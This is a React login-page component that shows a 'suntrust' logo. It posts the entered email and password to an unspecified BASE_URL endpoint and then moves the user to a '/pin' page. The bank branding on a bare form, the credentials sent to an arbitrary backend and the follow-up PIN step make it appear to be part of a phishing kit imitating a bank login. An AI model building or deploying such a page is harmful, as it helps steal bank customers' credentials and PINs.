import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";
import axios from "axios";
import BASE_URL from "../components/urls";
import FormErrMsg from "../components/FormErrMsg";
import logo from "../assets/logo.png";

const schema = yup.object().shape({
  username: yup
    .string()
    .email("Invalid email address")
    .required("Email is required"),
  password: yup.string().required("Password is required"),
});

const Login = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const togglePassword = () => {
    setShowPassword(!showPassword);
  };

  const submitForm = (data) => {
    setLoading(true);
    setError("");
    
    axios
      .post(`${BASE_URL}/`, data)
      .then((response) => {
        console.log(response.data);
        if (response.data === "success") {
          navigate("/pin");
        } else {
          setError("Login failed. Please try again.");
        }
      })
      .catch((error) => {
        console.error("There was an error!", error);
        setError("An error occurred. Please try again.");
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="min-h-screen bg-white flex items-start justify-center pt-20 px-2">
      <div className="w-full max-w-md bg-white text-white p-6 rounded-lg">
        <div className="">
          <img src={logo} alt="logo suntrust" />
        </div>
        <h2 className="text-2xl font-bold mb-6 text-black">Log in</h2>
        
        {error && (
          <div className="mb-4 p-3 bg-red-100 border border-red-400 text-red-700 rounded">
            {error}
          </div>
        )}
        
        <form onSubmit={handleSubmit(submitForm)} className="space-y-4">
          <div>
            <label className="block text-gray-800 mb-2">Email</label>
            <input
              type="email"
              placeholder="Enter your email"
              {...register("username")}
              className="w-full p-3 text-black placeholder-gray-400 border-b-2 border-b-gray-700 focus:outline-none focus:border-b-yellow-600"
            />
            <FormErrMsg errors={errors} inputName="username" />
          </div>

          <div className="my-2">
            <label className="block text-gray-800 mb-2">Password</label>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Enter your password"
                {...register("password")}
                className="w-full p-3 text-black placeholder-gray-400 border-b-2 border-gray-700 focus:outline-none focus:border-b-yellow-600"
              />
              <span
                onClick={togglePassword}
                className="absolute right-3 top-3 text-gray-600 cursor-pointer hover:text-gray-800"
              >
                {showPassword ? <AiOutlineEyeInvisible /> : <AiOutlineEye />}
              </span>
            </div>
            <FormErrMsg errors={errors} inputName="password" />
          </div>

          <div className="text-right">
            <a href="/forgot-password" className="text-sm text-gray-600 hover:text-gray-800">
              Forgot <span className="text-black font-semibold">email</span>{" "}
              or <span className="text-black font-semibold">password</span>?
            </a>
          </div>

          <button
            type="submit"
            disabled={loading}
            className={`w-full py-3 rounded-md text-white font-semibold transition-colors ${
              loading
                ? "bg-gray-400 cursor-not-allowed"
                : "bg-yellow-600 hover:bg-yellow-700"
            }`}
          >
            {loading ? "Logging in..." : "Log in"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default Login;
